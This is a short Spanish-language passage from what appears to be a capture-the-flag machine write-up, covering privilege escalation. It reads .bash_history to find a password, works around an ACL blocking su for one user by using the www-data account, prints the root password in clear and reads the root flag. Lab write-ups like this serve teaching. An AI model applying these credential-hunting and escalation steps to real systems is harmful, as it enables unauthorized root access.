## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
id
cat .bash_history
```

Aqui encontramos una nueva contraseña. Intentamos ponerla para root

```bash
su root

#Output
-bash: /bin/su: Permission denied

ls -la /bin/su
getfacl /bin/su
```

Podemos ver con el comando `getfacl /bin/su` que hay un privilegio especial que hace que el usuario loki solo pueda leer el binario **su**
pero sin poder ejecutarlo.

Como tenemos acceso a la maquina tambien con www-data, podemos desde hay lanzar el comando **su**

```bash
su root
Password: lokipasswordmischieftrickery

whoami

#Output
root

cat /root/root.txt
find / \-name root.txt 2>/dev/null
cat /usr/lib/gcc/x86_64-linux-gnu/7/root.txt
```

Ya somos root y podemos leer la flag.


